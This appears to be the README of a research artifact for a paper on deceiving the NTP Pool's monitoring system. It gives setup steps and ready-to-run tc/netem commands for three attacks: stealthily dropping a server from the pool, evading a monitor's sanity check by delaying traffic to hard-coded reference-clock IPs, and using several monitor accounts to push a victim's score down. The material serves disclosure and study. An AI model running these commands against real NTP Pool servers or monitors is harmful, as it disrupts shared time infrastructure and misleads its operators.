# NTP_monitor_exp_Eatwatchdog

1. Paper Name : Did the Shark Eat the Watchdog in the NTP Pool? Deceiving the NTP Pool’s Monitoring System

2. Paper Description
This paper shows three ways to experimentally reproduce the vulnerabilities of the NTP Pool monitoring system we have identified. A rough description of each experiment is as follows.

2-1) Stealthy Attack for to make NTP servers disappear from the pool.
Assume that the attacker wants to remove the NTP server from the pool, but does not want to notify the NTP server owner.
An attacker assigns Adaptive one-way-Delay while viewing the NTP server and the score log of the NTP server.
This is to exploit the phenomenon that the score is maintained when a specific NTP server is scored as Offset.
At this time, it is possible to create a phenomenon that does not appear in the NTP Pool without being noticed by the NTP Server owner.

2-2) Bypassing the monitoring station’s Sanity Check and skewing the NTP server’s score.
The Reference Clock for Sanity Check of Monitoring Station is hard-coded.
If an attacker adds one-way-delay to the monitoring station’s local clock and the reference clock for sanity check at the same time, it can violate the sanity check of the monitor server (the server that aggregates and evaluates scores).
The victim monitoring station can then lower the score by evaluating the NTP servers with a skewed offset.

2-3) Malicious consensus of Multi Monitoring stations.
The Beta Site operates a Monitoring System based on Multiple Monitoring Stations.
If this monitoring system is also applied to the official site, it seems good to restrict the subscription conditions of the monitoring station.
If an attacker secures many monitoring station qualifications with more than one account, the monitoring timing can be matched by analyzing the scoring cycle of the NTP server.
In this case, an attacker can take advantage of their monitoring stations to quickly lower the score of the NTP server.
If an attacker intentionally fails the monitoring station’s sanity check, the server’s scoring period can be changed every 2 minutes.

3. Installation Guide

3-1) Software for execution
- tc(Traffic Control) : iproute2 5.5.0-1ubunutu1
- nodeJS v18.14.2
- ntpd 4.2.8p12@1.3728-o
- ntppool-monitor : Even if you install this software, you need to obtain an authentication key to run the software. Therefore, Experiment 2 and Experiment 3 should participate in the monitor beta tester before conducting the experiment.

3-2) Presets
Machine : Laptop or desktop where ntpd can be installed.
OS : Ubuntu 20.04 LTS version(Client or Server version) or earlier (for higher versions, "chronyd" may be installed and "ntpd" may need to be installed separately.)
Minimum number of machines required per experiment
 - Experiment 1 : NTP Server 1, Monitor 1(More than one.)
 - Experiment 2 : NTP Server 1, Monitor 1(More than one.)
 - Experiment 3 : NTP Server 1, Monitors 2(More than two.)
NTP Version : NTPv4

3-3) NTP Pool setting
- Registering an NTP Server with an NTP Pool

Web page 1 : https://manage.beta.grundclock.com/manage

Web page 2 : https://web.beta.grundclock.com/en/join.html

For the experiment, it is necessary to join the NTP pool and register the server. Follow the "Web page 1" link and write the email you want to join under the "Login/Add server" button. If the administrator approves, click the button to log in to the administrator screen.
In order to register an NTP server, a machine with NTP installed using a static IP is required.
When you sign up and log in, you can view information about your registered NTP server and monitor machines in the left sidebar.
Related information can also be found on "Web page 2".

- Registering a Monitor with NTP Pool

Web page 3 : https://community.ntppool.org/c/monitor-operators/13

To register a monitor with NTP Pool, you must obtain a pre-registered beta tester qualification.
The beta tester is currently operated by a small number of members, and only members with permission from the operator can sign up.
Although you are not currently receiving additional subscriptions, you must contact the operator (Ask Bjørn Hansen) by email to register the monitor.
"Web page 3" is a community page for beta testers participating in monitoring activities.
The following description is a guide related to how to install the "NTP Pool Monitor" posted by the operator in the community.
---------------------------------------------------------------------------
These are the instructions for installing a monitor on the beta system. If you run into a specific problem, please start a new thread in this category to make it easier for others to find.
The default packages are available in an apt/deb repository (debian and ubuntu) and .rpm, with builds for i386, amd64 and arm64. There are also binaries available for FreeBSD and other languages supported by Go can be added. Please let me know if you need something else than these Linux flavors.
The repository installation instructions are at https://builds.ntppool.dev/repo/
Note that the monitoring agent for the beta site is only in the testing flavors for now. On RedHat-flavor systems you need

  yum --enablerepo=ntppool-test install -y ntppool-monitor - REDHAT

  sudo apt install ntppool-monitor - UBUNTU

1) To register a monitor go to the new monitors page on the beta manage site and add the IP address of the monitor (IPv4 and IPv6 are separate monitors, even if they run on the same server).
2) Verify that the “airport code” is reasonable and then send me the IP and what the public name of the monitor should be (typically I’ve used the nearest big city or similar). I’ll input this this in the system and switch the status from pending to testing.
3) When the monitor has been marked for testing you can go back to the manage site and issue API keys. It’ll provide you a .json file you can download.
4) Place the .json file (named something like uslax1-xyz123.test.mon.ntppool.dev.json) into the directory /etc/ntpmon (make sure it’s readable by the ntpmon user). Working files (cached authentication tokens and certificates) are in /var/run/ntpmon.
5) Start an instance of the daemon specifying the monitor name (same as the config file without the .json extension).
sudo systemctl enable --now ntppool-monitor@uslax1-xyz123.test.mon.ntppool.dev
6) watch the logs with sudo journalctl -f -u ntppool-monitor@'*'


In testing mode the monitor will only do an occasional check of each system in the beta system, but this alone will be very helpful for me when developing and testing the new scoring algorithms and logic for choosing appropriate “nearby” monitors for each NTP server.

---------------------------------------------------------------------------

3-4) NTP Server configuration
If you need to set up a synchronization server for your NTP server and monitor for the convenience of your experiment, you can follow these steps:

1) Enter 'sudo apt install ntp' in the Linux console window.
2) Enter 'vi /etc/ntp.conf' in the Linux console window.
3) The domain address is the default setting after the part that says 'server'. You can annotate this part and enter the domain or IP of the synchronization server.
* We recommend that you do not use domains or IPs registered with NTP Pool. If possible, we recommend synchronizing with the Stratum 1 server.
4) Restart NTP by typing 'service ntpd restart' in the console window after saving settings.
5) Enter 'ntpq -p' command to check NTP synchronization status.

3-5) Web page for observation of experiment results
web page 4 : https://web.beta.grundclock.com/scores/
* The experimenter can view the logs and graphs of the NTP servers registered in the NTP pool and the status of operations on the monitor. On this webpage, you can check your score by entering the IP of the NTP server registered on the beta site.

4. Usage
/* All experimental results can be found in the Score log(web page 1) and graph of the Victim NTP server. */

4-1) Experiment 1
* tc command : If you are familiar with the 'tc' command, you can properly categorize the interface or class.

sudo tc qdisc add dev {nw_interface1} root handle 1: prio

sudo tc qdisc add dev {nw_interface1} parent 1:3 handle 30: netem delay 50ms 20ms // 50ms & 20ms is optional value for network delay

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 139.178.70.122 flowid 1:3 // '139.178.70.122' is monitor's IP. You can easily find the monitor IP corresponding to the NTP Pool domain with the 'nslookup' command.

* Node.js command:

node exp1_calcalphabeta.js

// The IP value of the variable "resp_URL" must be changed to continuously check the score of the NTP server being attacked.

* Restore: Delete the tc interface

sudo tc qdisc del dev {nw_interface1} root

4-2) Experiment 2

 *Experiment 2 Constraints

1) The monitor must also be a server that serves as an NTP server.

2) The monitor must be at least 2 Startum.

If the above two conditions are met, the 'ntpd' and 'ntpdate' commands can be used to determine the synchronization server of the monitor.

* Add delay to all outbound traffic of the monitor

sudo tc qdisc add dev {nw_interface1} root netem delay 500ms 20ms

* Add delay only to the top stratum of the monitor

sudo tc qdisc add dev {nw_interface1} root handle 1: prio

sudo tc qdisc add dev {nw_interface1} parent 1:3 handle 30: netem delay 10ms 4ms

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst {upper_stratum_NTP_server_IP} flowid 1:3 // 'upper_stratum_NTP_server_IP' is an NTP server on the upper stratum of the monitor. If the monitor also serves as an NTP server, you can check what the top NTP server is with the 'ntpd' command or the 'ntpdate' command.

* Avoiding Sanity Check : Each IP refers to the IP returned from the domain address that is hard-coded in the monitor source code, and if the domain name is changed or the IP is changed, the IP list to be entered must be changed to suit the experimental environment.

sudo tc qdisc add dev {nw_interface1} root handle 1: prio

sudo tc qdisc add dev {nw_interface1} parent 1:3 handle 30: netem delay 500ms

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 17.253.68.125 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 61.205.120.130 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 17.253.26.125 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 169.229.128.134 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 164.67.62.199 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 17.253.54.253 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 17.253.34.125 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 130.133.1.10 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 193.162.159.194 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 192.36.143.234 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 193.0.0.229 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 17.253.114.125 flowid 1:3

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 118.220.200.235 flowid 1:3

* Excute script

node exp2_sandm.js

// The IPs stored in the 'beta_NTP_servers' variable are a list of NTP servers found on the beta site and as of July 2022.

* Restore: Delete the tc interface

sudo tc qdisc del dev {nw_interface1} root

4-3) Experiment 3

// In order to reproduce this experiment, it is necessary to be able to control at least two monitors.

* Region 1 Monitor

sudo tc qdisc add dev {nw_interface1} root handle 1: prio

sudo tc qdisc add dev {nw_interface1} parent 1:3 handle 30: netem delay 500ms

sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst {Victim NTP Server} flowid 1:3

* Region 2 Monitor

sudo tc qdisc add dev {nw2_interface1} root handle 1: prio

sudo tc qdisc add dev {nw2_interface1} parent 1:3 handle 30: netem delay 500ms

sudo tc filter add dev {nw2_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst {Victim NTP Server} flowid 1:3

* Delete the tc interface

** Region 1 Monitor

sudo tc qdisc del dev {nw_interface1} root

** Region 2 Monitor

sudo tc qdisc del dev {nw2_interface1} root

5. Development Environment

5-1) System Specifications

The Xeon server desktop (Intel® Xeon® CPU ES-2620 v4 2.10 GHz 16 cores, 256 GB RAM),
Ubuntu 20.04 Server

6. Contributing

Improved code and bug reporting are welcome. You can contribute directly to GitHub, or contact the code author by mail.

Code Author Email:

- jgsong@isslab.korea.ac.kr

- newshok@naver.com

7. License


8. Copyright
